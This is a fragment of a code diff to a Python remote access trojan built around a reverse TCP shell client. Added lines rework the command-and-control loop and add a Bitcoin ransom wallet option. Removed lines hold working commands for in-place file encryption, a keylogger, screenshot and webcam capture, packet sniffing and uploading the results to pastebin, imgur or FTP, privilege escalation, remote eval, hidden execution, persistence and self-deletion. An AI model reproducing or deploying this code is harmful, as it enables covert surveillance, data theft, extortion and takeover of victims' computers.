+            self._debug("{} returned error: {}".format(self.hide.func_name, str(e)))
+
 
         
     def diffiehellman(self):
@@ -1108,15 +1800,15 @@ class Client():
             return self._obfuscate(y)
         except Exception as e:
             self._debug("Diffie-Hellman transactionless key-agreement failed with error: {}\nrestarting in 5 seconds...".format(str(e)))
-            time.sleep(1)
-            return self.diffiehellman()
+            time.sleep(5)
+            return self.run()
 
 
     def session(self, *args, **kwargs):
         self.kill()
         try:
             port = 1337 if 'port' not in kwargs else int(kwargs.get('port'))
-            self._session['socket'] = self._get_connection(kwargs.get('host'), int(port)) if bool('host' in kwargs and self._get_ipv4_address(kwargs.get('host'))) else self._get_connection(self._get_address(), int(port))
+            self._session['socket'] = self._get_connection(kwargs.get('host'), int(port)) if bool('host' in kwargs and self._get_ipv4_address(kwargs.get('host'))) else self._get_connection(self._server(), int(port))
             _ = self._session['socket'].getpeername()
             self._session['connection'].set()
             self._debug('\nConnected to {}:{}\n'.format(*self._session['socket'].getpeername()))
@@ -1161,12 +1853,11 @@ class Client():
             try:
                 if self._session['connection'].wait(timeout=3.0):
                     prompt = {"id": "0" * 64, "client": self._session['id'], "command": "prompt", "data": "[{} @ %s]> " % os.getcwd()}
-                    self.send_data(**prompt)
-                    task   = self.recv_data()
+                    self._send(**prompt)
+                    task   = self._recv()
                     result = ""
                     if task:
                         command, _, action  = bytes(task['command']).partition(' ')
-                        self._debug("\nTask: {}\nClient: {}\nCommand: {}\n".format(task['id'], task['client'], task['command']))
                         if command in self._commands:
                             try:
                                 result  = bytes(self._commands[command]['method'](action)) if len(action) else bytes(self._commands[command]['method']())
@@ -1180,8 +1871,8 @@ class Client():
 
                     if result and result != "None":
                         task.update({"data": result})
-                        self._debug("Sending task results:\n{}".format(json.dumps(task, indent=2)))
-                        self.send_data(**task)
+                        self._results.update({time.time(): task})
+                        self._send(**task)
                     for name, worker in self._jobs.items():
                         if not worker.is_alive():
                             _ = self._jobs.pop(name, None)
@@ -1195,589 +1886,18 @@ class Client():
                 self._debug("{} returned error: {}\nRestarting in 5 seconds...".format(self.reverse_tcp_shell.func_name, str(e3)))
                 time.sleep(5)
                 break
-        t = self._jobs.pop(self.reverse_tcp_shell.func_name, None)
-        del t
+        _ = self._jobs.pop(self.reverse_tcp_shell.func_name, None)
+        del _
         self.kill()
         return self.run()
 
 
-    @config(platforms=['win32','linux2','darwin'], command=True, usage="help")
-    def help(self, command=None):
-        """
-        show usage information for commands
-        """
-        if not command:
-            try:
-                return json.dumps({self._commands[cmd]["usage"].encode(): self._commands[cmd]["description"].encode() for cmd in self._commands}, indent=2, sort_keys=True)
-            except Exception as e1:
-                return str(e1)
-        elif bytes(command) in self._commands:
-            try:
-                return json.dumps({self._commands[command]["usage"].encode(): self._commands[command]["description"].encode()}, indent=2, sort_keys=True)
-            except Exception as e2:
-                return str(e2)
-        else:
-            return "Invalid command - '{}' not found".format(str(command))
+    def run(self, *args, **kwargs):
+        self.session(*args, **kwargs)
+        self._jobs[self.reverse_tcp_shell.func_name] = threading.Thread(target=self.reverse_tcp_shell, name=time.time())
+        self._jobs[self.reverse_tcp_shell.func_name].start()
 
 
-    @staticmethod
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='encrypt <file>')
-    def encrypt(filepath):
-        """
-        encrypt the target file
-        """
-        if os.path.isfile(filepath):
-            try:
-                with open(filepath, 'rb') as fp:
-                    plaintext = fp.read()
-                ciphertext = Client._encrypt(plaintext)
-                if Client.debug:
-                    target = os.path.join(os.path.dirname(filepath), 'encrypted_%s' % os.path.basename(filepath))
-                    with open(target, 'wb') as fd:
-                        fd.write(ciphertext)
-                else:
-                    with open(filepath, 'wb') as fd:
-                        fd.write(ciphertext)
-                return filepath
-            except Exception as e:
-                return str(e)
-        else:
-            return "File '{}' not found".format(filepath)
-        
-
-    @staticmethod
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='decrypt <file>')
-    def decrypt(filepath):
-        """
-        decrypt the target file
-        """
-        if os.path.isfile(filepath):
-            try:
-                with open(filepath, 'rb') as fp:
-                    ciphertext = fp.read()
-                plaintext = Client._decrypt(ciphertext)
-                with open(filepath, 'wb') as fd:
-                    fd.write(plaintext)
-                return filepath
-            except Exception as e:
-                return str(e)
-        else:
-            return "File '{}' not found".format(filepath)
-
-
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='upload <mode> <file>')
-    def upload(self, args):
-        """
-        upload file/data to imgur, pastebin, or ftp
-        """
-        try:
-            mode, _, source = str(args).partition(' ')
-            target  = 'upload_{}'.format(mode)
-            if not source or not hasattr(self, target):
-                return 'usage: upload <mode> <file>\nmode: ftp, pastebin, imgur\nfile: name of target file'
-            try:
-                return getattr(self, target)(source)
-            except Exception as e:
-                return 'Upload error: {}'.format(str(e))
-        except Exception as e:
-            return "{} returned error: '{}'".format(self.upload.func_name, str(e))
-
-
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='scan <mode> <host>')
-    def scan(self, arg):
-        """
-        scans host/network for online hosts and open ports
-        """
-        try:
-            if len(arg.split()) == 1:
-                if str(arg.split())[0] in ('ports','network'):
-                    host = self._get_local_ip()
-                    mode = str(arg).split()[0].lower()
-                else:
-                    return self.scan.usage
-            else:
-                mode, _, host = arg.partition(' ')
-                if mode not in ('ports', 'network'):
-                    return self.scan.usage
-                if not self._get_ipv4_address(host):
-                    return "Invalid target IP address"
-            if mode == 'network':
-                return self._scan_network(host)
-            elif mode == 'ports':
-                if self._ping(host):
-                    return self._scan_host(host)
-                else:
-                    return "{} is offline".format(host)
-            else:
-                return self.scan.usage
-        except Exception as e:
-            return "{} returned error: '{}'".format(self.scan.func_name, str(e))        
-
-
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='webcam <mode> [options]')
-    def webcam(self, args=None):
-        """
-        capture from webcam and upload to imgur or ftp
-        """
-        if not args:
-            return self._get_usage(self.webcam)
-        try:
-            port = None
-            args = str(args).split()
-            mode = args[0].lower() if len(args) else 'stream'
-            if 'image' in mode:
-                mode = 'image'
-            elif 'video' in mode:
-                mode = 'video'
-            elif 'stream' in mode:
-                mode = 'stream'
-                if len(args) != 2:
-                    return "Error - stream mode requires argument: 'port'"
-                port = args[1]
-            else:
-                return self._get_usage(self.webcam)
-            result   = getattr(self, '_webcam_{}'.format(mode))(port=port)
-            return result
-        except Exception as e:
-            return "{} returned error: '{}'".format(self.webcam.func_name.strip('_').title(), str(e))
-
-
-    @config(platforms=['linux2','darwin'], command=True, usage='packetsniffer [mode]')
-    def packetsniffer(self, *args):
-        """
-        capture packets and upload to pastebin or ftp
-        """
-        def sniffer(self, seconds, *args):
-            limit = time.time() + seconds
-            sniffer_socket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
-            while time.time() < limit:
-                try:
-                    recv_data = sniffer_socket.recv(2048)
-                    recv_data, ip_bool = self._packetsniffer_eth_header(recv_data)
-                    if ip_bool:
-                        recv_data, ip_proto = self._packetsniffer_ip_header(recv_data)
-                        if ip_proto == 6:
-                            recv_data = self._packetsniffer_tcp_header(recv_data)
-                        elif ip_proto == 17:
-                            recv_data = self._packetsniffer_udp_header(recv_data)
-                except: break
-            sniffer_socket.close()
-            try:
-                output = cStringIO.StringIO('\n'.join(self.packetsniffer.capture))
-                result = self._upload_pastebin(output) if 'ftp' not in args else self._upload_ftp(output)
-            except Exception as e:
-                self._debug("packetsniffer manager returned error: {}".format(str(e)))
-        try:
-            duration = 300.0 if not len([i for i in args if str(i).isdigit()]) else int([i for i in args if str(i).isdigit()][0])
-            if self.packetsniffer.func_name in self._jobs:
-                return "packetsniffer running for {}".format(self._get_status(self._jobs[self.packetsniffer.func_name].name))
-            if not str(duration).isdigit():
-                return "packetsniffer argument 'duration' must be integer"
-            duration = int(duration)
-            self._jobs[self.packetsniffer.func_name] = threading.Thread(target=sniffer, args=(self, duration), name=time.time())
-            self._jobs[self.packetsniffer.func_name].start()
-            return 'Capturing network traffic for {} seconds'.format(duration)
-        except Exception as e:
-            return "{} returned error: '{}'".format(self.packetsniffer.func_name.title(), str(e))
-
-
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='cd <path>')
-    def cd(self, path='.'):
-        """
-        change directory
-        """
-        if os.path.isdir(path):
-            os.chdir(path)
-        else:
-            os.chdir('.')
-
-
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='ls <path>')
-    def ls(self, path='.'):
-        """
-        list directory contents
-        """
-        return '\n'.join(os.listdir(path)) if os.path.isdir(path) else 'Error: path not found'
-    
-        
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='ps [args]')
-    def ps(self, args=None):
-        """
-        list, search, kill processes
-        """
-        output = ""
-        process_list = psutil.process_iter()
-        if not args:
-            try:
-                
-                output = json.dumps({str(p.pid): "{:>25} | {:>15}".format(str(p.name())[:19], str(p.status())) for p in process_list})
-            except Exception as e:
-                Client._debug(str(e))
-        else:
-            cmd, _, arg  = str(args).partition(' ')
-            if 'search' in cmd:
-                try:
-                    output = json.dumps({str(p.pid): "{:>25} | {:>15}".format(str(p.name())[:19], str(p.status())) for p in process_list if str(cmd) in str(p.name())})
-                except Exception as e:
-                    Client._debug(str(e))
-            elif 'kill' in cmd or 'terminate' in cmd:
-                if str(arg).isdigit():
-                    try:
-                        pr = psutil.Process(pid=int(arg))
-                        pr.kill()
-                        output = "\nProcess {} was killed".format(arg)
-                    except: pass
-                else:
-                    for p in process_list:
-                        try:
-                            if str(cmd) in str(p.name()):
-                                p.kill()
-                                output += "\nProcess {} killed".format(cmd)
-                        except Exception as e:
-                            Client._debug(str(e))
-        return output
-
-    
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='pwd')
-    def pwd(self):
-        """
-        show name of present working directory
-        """
-        return '\n' + os.getcwd()
-
-
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='cat <path>')
-    def cat(self, path):
-        """
-        display file contents
-        """
-        output = ""
-        if not os.path.isfile(path):
-            return "Error: file not found"
-        target = open(path, 'r')
-        while True:
-            try:
-                line = target.readline().rstrip()
-                if not line.isspace() and len(line) and len(output + '\n' + line) < 4096:
-                    output += '\n' + line
-                else: break
-            except: break
-        return output
-
-
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='set <args>')
-    def set(self, arg):
-        """
-        set client options
-        """
-        try:
-            target, _, opt = arg.partition(' ')
-            option, _, val = opt.partition('=')
-            if not hasattr(self, target) or target not in self._commands:
-                return "command '{}' not found".format(target)
-            if val.isdigit() and int(val) in (0,1):
-                val = bool(int(val))
-            elif val.isdigit():
-                val = int(val)
-            elif val.lower() in ('true', 'on', 'enable'):
-                val = True
-            elif val.lower() in ('false', 'off', 'disable'):
-                val = False
-            elif ',' in val:
-                val = val.split(',')
-            setattr(getattr(self, target), option, val)
-        except Exception as e:
-            return "{} returned error: '{}'".format(self.set.func_name.strip('_').title(), str(e))
-        return self.options(target.lower())
-
-
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='wget <url>')
-    def wget(self, url, filename=None):
-        """
-        download file from url
-        """
-        path, http = urllib.urlretrieve(url, filename) if url.startswith('http') else 'Invalid target URL - must begin with http:// or https://'
-        return path
-
-
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='kill')
-    def kill(self):
-        """
-        shutdown the current connection
-        """
-        try:
-            self._session.get('socket').close()
-            _ = self._session.pop('socket', None)
-            del _
-        except: pass
-
-        try:
-            self._session['socket'] = None
-            self._session['key']    = None
-            self._session['id']     = None
-        except Exception as e1:
-            self._debug("{} returned error: {}".format(self.kill.func_name, str(e1)))
-
-        try:
-            self._session['connection'].clear()
-        except Exception as e2:
-            self._debug("{} returned error: {}".format(self.kill.func_name, str(e2)))
-
-        for t in [i for i in self._jobs]:
-            try:
-                _ = self._jobs.pop(t, None)
-                del _
-            except: pass
-
-
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='jobs')
-    def jobs(self):
-        """
-        show current active client jobs
-        """
-        try:
-            return json.dumps({a: self._get_status(c=time.time()-float(self._jobs[a].name)) for a in self._jobs if self._jobs[a].is_alive()})
-        except Exception as e:
-            return "Command 'info' returned error: '{}'".format(str(e))
-
-
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='stop <job>')
-    def stop(self, target):
-        """
-        stop a job in progress
-        """
-        try:
-            if target in self._jobs:
-                _ = self._jobs.pop(target, None)
-                return "Job '{}' was stopped.".format(target)
-            else:
-                return "Job '{}' not found".format(target)
-        except Exception as e:
-            return "{} returned error: '{}'".format(self.stop.func_name.strip('_').title(), str(e))
-
-
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='unzip <file>')
-    def unzip(self, path):
-        """
-        unzip a compressed archive/file
-        """
-        if os.path.isfile(path):
-            try:
-                return zipfile.ZipFile(path).extractall('.')
-            except Exception as e:
-                return "{} returned error: '{}'".format(self.unzip.func_name.strip('_').title(), str(e))
-        else:
-            return "File '{}' not found".format(path)
-
-
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='standby')
-    def standby(self):
-        """
-        disconnect from server but keep client alive
-        """
-        def _standby(self):
-            addr = None
-            try:
-                addr = self._session['socket'].getpeername()
-            except: pass
-            self.kill()
-            while True:
-                time.sleep(60)
-                if addr:
-                    self.session(host=addr[0], port=addr[1])
-                else:
-                    self.session()
-                if self._session['connection'].is_set():
-                    break
-            return self.reverse_tcp_shell()
-        try:
-            self._jobs[self.standby.func_name] = threading.Timer(5.0, _standby, args=(self,))            
-            self._jobs[self.standby.func_name].start()
-            return "{} standing by".format(self._info.get('ip'))
-        except Exception as e:
-            return "{} returned error: '{}'".format(self.standby.func_name.strip('_').title(), str(e))
-
-
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='admin')
-    def admin(self):
-        """
-        check if current user has administrator privileges
-        """
-        try:   
-            return json.dumps({'username': self._info.get('username'),  'administrator': bool(os.getuid() == 0 if os.name is 'posix' else ctypes.windll.shell32.IsUserAnAdmin())})
-        except Exception as e:
-            return "{} returned error: '{}'".format(self.admin.func_name.strip('_').title(), str(e))
-
-
-    @config(platforms=['win32'], command=True, usage='escalate')
-    def escalate(self):
-        """
-        attempt to escalate privileges
-        """
-        try:
-            if self._info.get('administrator'):
-                return "Current user '{}' has administrator privileges".format(self._info.get('username'))
-            if hasattr(self, '__f__') and os.path.isfile(long_to_bytes(long(self.__f__))):
-                if os.name is 'nt':
-                    ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(long_to_bytes(long(self.__f__))))
-                    sys.exit()
-                else:
-                    return "Privilege escalation not yet available on '{}'".format(sys.platform)
-        except Exception as e:
-            return "{} returned error: '{}'".format(self.escalate.func_name.strip('_').title(), str(e))
-
-
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='evaluate <code>')
-    def evaluate(self, code):
-        """
-        eval() code directly and display results
-        """
-        try:
-            return eval(code)
-        except Exception as e:
-            return "eval('{}') failed with error: {}".format(str(code), str(e))
-
-
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='execute <path>')
-    def execute(self, path):
-        """
-        execute a program in a hidden process
-        """
-        if os.path.isfile(path):
-            name = os.path.splitext(os.path.basename(path))[0]
-            try:
-                self._jobs[name] = self.hidden_process(path)
-                return "Job launched '{}' in a hidden process".format(name)
-            except Exception as e:
-                try:
-                    self._jobs[name] = subprocess.Popen(path, 0, None, None, subprocess.PIPE, subprocess.PIPE)
-                    return "Job launched '{}' in a standard subprocess (visible on host machine)".format(name)
-                except Exception as e:
-                    return "{} returned error: {}".format(self.execute.func_name, str(e))
-        else:
-            return "File '{}' not found".format(str(path))
-
-
-    @config(platforms=['win32','linux2','darwin'], max_bytes=4000, buffer=cStringIO.StringIO(), window=None, command=True, usage='keylogger [mode]')
-    def keylogger(self, *args, **kwargs):
-        """
-        run keylogger and upload logs to pastebin or ftp
-        """
-        def manager(self):
-            while True:
-                if self.keylogger.buffer.tell() > self.keylogger.max_bytes:
-                    result  = self._upload_ftp(self.keylogger.buffer) if 'ftp' in args else self._upload_pastebin(bytes(self.keylogger.buffer))
-                    self.keylogger.buffer.reset()
-                    return result
-                else:
-                    time.sleep(5)
-        if self.keylogger.func_name not in self._jobs:
-            self._jobs[self.keylogger.func_name] = threading.Thread(target=self._keylogger, name=time.time())
-            self._jobs[self.keylogger.func_name].setDaemon(True)
-            self._jobs[self.keylogger.func_name].start()
-            self._jobs[manager.func_name] = threading.Thread(target=manager, args=(self,), name=time.time())
-            self._jobs[manager.func_name].setDaemon(True)
-            self._jobs[manager.func_name].start()
-        return self._get_status(float(self._jobs[self.keylogger.func_name].name))
-    
-
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='screenshot [mode]')
-    def screenshot(self, *args):
-        """
-        capture screenshot and upload to imgur or ftp
-        """
-        try:
-            with mss.mss() as screen:
-                img = screen.grab(screen.monitors[0])
-            png     = self._get_png(img)
-            result  = self._upload_imgur(png) if 'ftp' not in args else self._upload_ftp(png)
-            return result
-        except Exception as e:
-            return "{} returned error: '{}'".format(self.screenshot, str(e))
-
-
-    @config(platforms=['win32','linux2','darwin'], methods={method: {'established': bool(), 'result': bytes()} for method in ['hidden_file','scheduled_task','registry_key','startup_file','launch_agent','crontab_job']}, command=True, usage='persistence <args>')
-    def persistence(self, args=None):
-        """
-        establish persistent access to the client host machine
-        """
-        if not args:
-            for method in [_ for _ in self.persistence.methods if not self.persistence.methods[_]['established']]:
-                target = '_persistence_add_{}'.format(method)
-                if sys.platform in getattr(self, target).platforms:
-                    established, result = getattr(self, target)()
-                    self.persistence.methods[method]['established'] = established
-                    self.persistence.methods[method]['result'] = result
-                else:
-                    self.persistence.methods[method]['established'] = False
-                    self.persistence.methods[method]['result'] = "Persistence method '{}' is not compatible with {}".format(method, sys.platform)
-            return json.dumps(self.persistence.methods, indent=2)
-        else:
-            cmd, _, method = str(args).partition(' ')
-            method = method.replace(' ','_') if ' ' in method else method
-            if not method:
-                return "No persistence method selected\n{}".format(self._get_usage(self.persistence))
-            elif cmd not in ('add','remove'):
-                return "Invalid option '{}'\n{}".format(cmd, self._get_usage(self.persistence))
-            elif method not in self.persistence.methods:
-                return "Invalid persistence method '{}'\n{}".format(method, self._get_usage(self.persistence))
-            elif self.persistence.methods[method].get('established'):
-                return json.dumps(self.persistence.methods[method], indent=2)
-            else:
-                target = '_persistence_{}_{}'.format(cmd, method)
-                if sys.platform in getattr(self, target).platforms:
-                    established, result = getattr(self, target)()
-                    self.persistence.methods[method]['established'] = established
-                    self.persistence.methods[method]['result'] = result
-                else:
-                    self.persistence.methods[method]['established'] = False
-                    self.persistence.methods[method]['result'] = "Persistence method '{}' is not compatible with {}".format(method, sys.platform)
-                return json.dumps(self.persistence.methods[method], indent=2)
-            
-                
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='selfdestruct')
-    def selfdestruct(self):
-        """
-        self-destruct and leave no trace on disk
-        """
-        try:
-            self.abort = True
-            self.kill()
-            
-            if hasattr(self, '__f__') and os.path.isfile(self._get_config(long(self.__f__))).read():
-                try:
-                    os.remove(self.__f__)
-                except: pass
-                
-                for method in [_ for _ in self.persistence.methods if self.persistence.methods[_]]:
-                    try:
-                        remove = getattr(self, '_persistence_remove_{}'.format(method))()
-                    except Exception as e2:
-                        self._debug("Error removing persistence method '{}': {}".format(method, str(e2)))
-            
-            try:
-                os.remove(__file__)
-            except: pass
-
-        finally:
-            shutdown = threading.Timer(1, self._shutdown)
-            shutdown.start()
-            sys.exit(0)
-            
-
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='hide <path>')
-    def hide(self, path, shell=True):
-        """
-        execute a program in a hidden process 
-        """
-        try:
-            info = subprocess.STARTUPINFO()
-            info.dwFlags = subprocess.STARTF_USESHOWWINDOW | subprocess.CREATE_NEW_PROCESS_GROUP
-            info.wShowWindow = subprocess.SW_HIDE
-            p = subprocess.Popen(path, startupinfo=info, shell=shell)
-            return p
-        except Exception as e:
-            self._debug("Hidden process error: {}".format(str(e)))
 
 
 
@@ -1822,18 +1942,28 @@ def main(*args, **kwargs):
             except Exception as e5:
                 Client._debug("Dynamic FTP configuration failed: {}".format(str(e5)))
 
+        if 'r' in kwargs:
+            try:
+                r = kwargs.get('r')
+                btc_address = Client._get_config(r)
+                Client._configure('ransom', wallet=btc_address)
+            except Exception as e6:
+                Client._debug("Dynamic BTC wallet configuration failed: {}".format(str(e6)))
+                
         if 'AES' in globals() and 'HMAC' in globals() and 'SHA256' in globals():
             Client._configure('encrypt', mode='AES', hash_algo='sha256')
         else:
             Client._configure('encrypt', mode='XOR', hash_algo='sha256')
 
     finally:
-        payload = Client(**kwargs)
-        if 'v' in kwargs:
-            payload.run(host='127.0.0.1')
+        if 'debug' in sys.argv:
+            Client.debug = True
+            handler = Client(**kwargs)
+            handler.run(host='127.0.0.1')
         else:
-            payload.run()
-        return payload
+            handler = Client(**kwargs)
+            handler.run()
+        return handler
 
 
 if __name__ == '__main__':
@@ -1851,7 +1981,6 @@ if __name__ == '__main__':
   "s": "81399447134546511973",
   "u": "76299683425183950643", 
   "t": "79310384705633414777",
-  "v": "00000000000000000000",
   "w": "77888090548015223857",
   "z": "79892739118577505130"
 })
